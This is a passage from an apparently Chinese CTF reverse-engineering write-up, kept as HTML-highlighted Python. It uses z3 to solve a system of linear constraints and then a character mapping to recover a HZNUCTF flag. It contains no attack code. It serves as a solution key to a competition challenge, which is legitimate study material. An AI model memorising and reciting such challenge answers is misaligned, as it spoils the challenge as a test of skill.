class="hljs-number">16</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>] == <span class="hljs-number">948348</span>,)<br>s.add(<span class="hljs-number">97</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">6969</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>] + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] == <span class="hljs-number">777044</span>,)<br>s.add(<span class="hljs-number">177</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">699</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">64</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">96</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">222</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">224</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>] + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] - <span class="hljs-number">28</span> * enc[<span class="hljs-number">28</span>] == <span class="hljs-number">185016</span>,)<br>s.add(<span class="hljs-number">77</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">96</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">9</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">0</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">222</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">224</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">25</span>] - -<span class="hljs-number">58</span> * enc[<span class="hljs-number">26</span>] + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">28</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">29</span>] == <span class="hljs-number">130106</span>)<br><br><br><span class="hljs-comment"># 求解</span><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    model = s.model()<br>    flag = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(model[enc[j]].as_long()) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>)])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag is:&quot;</span>, flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution found.&quot;</span>)<br></code></pre></td></tr></table></figure><p>output：<br>Flag is: <strong>H1Z1N1U1C1T1F1{1a6d275f7-463}1</strong><br>可以看到这里的一一对应关系 <code>HZNUCTF&#123;</code> 对应<code>11111111</code>,仍然回到这串数字<code>111111116257645365477364777645752361</code>,可以得到映射表 ‘6’-&gt;’a’,’2’-&gt;’d’,’5’-&gt;’7’,’7’-&gt;’f’,’4’-&gt;’-‘,’3’-&gt;’6’,’1’-&gt;’}’<br>继续求解</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">_encrypted_</span>):<br>    res= <span class="hljs-string">&quot;6257645365477364777645752361&quot;</span><br>    <br>    char_map = &#123;&#125;<br><br>    remaining_map = &#123;<br>        <span class="hljs-string">&#x27;6&#x27;</span>: <span class="hljs-string">&#x27;a&#x27;</span>,<br>        <span class="hljs-string">&#x27;2&#x27;</span>: <span class="hljs-string">&#x27;d&#x27;</span>,<br>        <span class="hljs-string">&#x27;5&#x27;</span>: <span class="hljs-string">&#x27;7&#x27;</span>,<br>        <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;f&#x27;</span>,<br>        <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;-&#x27;</span>,<br>        <span class="hljs-string">&#x27;3&#x27;</span>: <span class="hljs-string">&#x27;6&#x27;</span>,<br>        <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;&#125;&#x27;</span><br>    &#125;<br>    char_map.update(remaining_map)<br>    <br>    result = <span class="hljs-string">&quot;HZNUCTF&#123;&quot;</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> res:<br>        result += char_map[num]<br>    <br>    <span class="hljs-keyword">return</span> result<br><br>s = Solver()<br><br>enc = [Int(<span class="hljs-string">f&#x27;x<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>)]<br><br>s.add(<span class="hljs-number">7</span> * enc[<span class="hljs-number">0</span>] == <span class="hljs-number">504</span>)<br>s.add(<span class="hljs-number">9</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> * enc[<span class="hljs-number">1</span>] == <span class="hljs-number">403</span>)<br>s.add((<span class="hljs-number">2</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">10</span> * enc[<span class="hljs-number">2</span>] == <span class="hljs-number">799</span>)<br>s.add(<span class="hljs-number">3</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">3</span>] == <span class="hljs-number">2938</span>)<br>s.add((<span class="hljs-number">5</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">19</span> * enc[<span class="hljs-number">3</span>]) + <span class="hljs-number">1</span> * enc[<span class="hljs-number">4</span>] == <span class="hljs-number">2042</span>)<br>s.add((<span class="hljs-number">7</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">3</span>]) + <span class="hljs-number">2</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">5</span> * enc[<span class="hljs-number">5</span>] == <span class="hljs-number">1225</span>)<br>s.add(<span class="hljs-number">11</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">33</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">44</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">77</span> * enc[<span class="hljs-number">6</span>] == <span class="hljs-number">7975</span>)<br>s.add(((<span class="hljs-number">21</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">24</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">6</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">7</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">15</span> * enc[<span class="hljs-number">7</span>] == <span class="hljs-number">229</span>)<br>s.add((<span class="hljs-number">2</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">65</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">15</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">8</span>] == <span class="hljs-number">2107</span>)<br>s.add((<span class="hljs-number">10</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">1</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">22</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">8</span>]) + <span class="hljs-number">30</span> * enc[<span class="hljs-number">9</span>] == <span class="hljs-number">4037</span>)<br>s.add((<span class="hljs-number">15</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">59</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">56</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">122</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">21</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">32</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>] == <span class="hljs-number">4950</span>)<br>s.add((((<span class="hljs-number">13</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">39</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">33</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">13</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">42</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">62</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>]) + <span class="hljs-number">11</span> * enc[<span class="hljs-number">11</span>] == <span class="hljs-number">12544</span>)<br>s.add((((<span class="hljs-number">23</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">63</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">25</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">2</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">32</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>]) + <span class="hljs-number">11</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>] == <span class="hljs-number">6585</span>)<br>s.add(((((<span class="hljs-number">223</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">53</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">3</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">65</span> * enc[<span class="hljs-number">6</span>]) + <span class="hljs-number">0</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">10</span>]) + <span class="hljs-number">16</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">13</span> * enc[<span class="hljs-number">13</span>] == <span class="hljs-number">6893</span>)<br>s.add(((((<span class="hljs-number">29</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">93</span> * enc[<span class="hljs-number">3</span>]) + <span class="hljs-number">33</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>]) + <span class="hljs-number">0</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">10</span>]) + <span class="hljs-number">96</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">68</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">33</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">14</span> * enc[<span class="hljs-number">14</span>] == <span class="hljs-number">1883</span>)<br>s.add((((<span class="hljs-number">69</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">77</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">93</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">3</span>]) + <span class="hljs-number">0</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">19</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">8</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">38</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">14</span>]) + <span class="hljs-number">15</span> * enc[<span class="hljs-number">15</span>] == <span class="hljs-number">8257</span>)<br>s.add(((((<span class="hljs-number">23</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">3</span>]) + <span class="hljs-number">12</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">24</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">14</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">0</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">1</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">68</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">68</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">14</span>]) + <span class="hljs-number">15</span> * enc[<span class="hljs-number">15</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">16</span>] == <span class="hljs-number">5847</span>)<br>s.add((((((<span class="hljs-number">24</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">3</span>]) + <span class="hljs-number">13</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">67</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">146</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">50</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">16</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">1</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">27</span> * enc[<span class="hljs-number">14</span>]) + <span class="hljs-number">45</span> * enc[<span class="hljs-number">15</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>]) + <span class="hljs-number">17</span> * enc[<span class="hljs-number">17</span>] == <span class="hljs-number">18257</span>)<br>s.add(((((<span class="hljs-number">25</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">89</span> * enc[<span class="hljs-number">2</span>]) + <span class="hljs-number">16</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">19</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">44</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">150</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">250</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">166</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">126</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">690</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">207</span> * enc[<span class="hljs-number">14</span>]) + <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">18</span>] == <span class="hljs-number">12591</span>)<br>s.add((((((<span class="hljs-number">5</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">8</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">160</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>]) + <span class="hljs-number">36</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">66</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">1</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">690</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">14</span>]) + <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">18</span>]) + <span class="hljs-number">19</span> * enc[<span class="hljs-number">19</span>] == <span class="hljs-number">52041</span>)<br>s.add(((((((<span class="hljs-number">29</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">0</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">60</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>]) + <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">21</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">69</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>]) + <span class="hljs-number">65</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">1</span> * enc[<span class="hljs-number">18</span>]) + <span class="hljs-number">39</span> * enc[<span class="hljs-number">19</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">20</span>] == <span class="hljs-number">20253</span>)<br>s.add((((((((<span class="hljs-number">45</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">10</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">650</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">900</span> * enc[<span class="hljs-number">4</span>]) + <span class="hljs-number">44</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">21</span> * enc[<span class="hljs-number">9</span>]) + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>]) + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">406</span> * enc[<span class="hljs-number">15</span>]) + <span class="hljs-number">651</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">18</span>]) + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] - <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>]) + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] == <span class="hljs-number">18768</span>)<br>s.add((((((<span class="hljs-number">555</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">6666</span> * enc[<span class="hljs-number">1</span>]) + <span class="hljs-number">70</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">510</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">90</span> * enc[<span 